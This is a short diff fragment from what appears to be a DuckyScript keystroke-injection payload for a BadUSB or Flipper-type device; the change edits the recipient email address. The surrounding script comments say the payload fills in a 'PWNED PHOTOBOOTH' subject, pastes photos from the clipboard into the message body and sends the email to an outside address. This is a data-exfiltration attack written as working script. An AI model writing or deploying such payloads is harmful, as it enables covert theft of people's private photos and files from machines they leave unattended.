@@ -50,7 +50,7 @@ REM tabs down to subject and pre-fills PWNED PHOTOBOOTH
 REM tabs down to body of message and pastes the photos from clipboard
 REM it then sends the message and 
 
-STRING flipperdemos@gmail.com
+STRING flipperdemos_>_>_>_>_@gmail.com
 DELAY 1000
 ENTER
 TAB
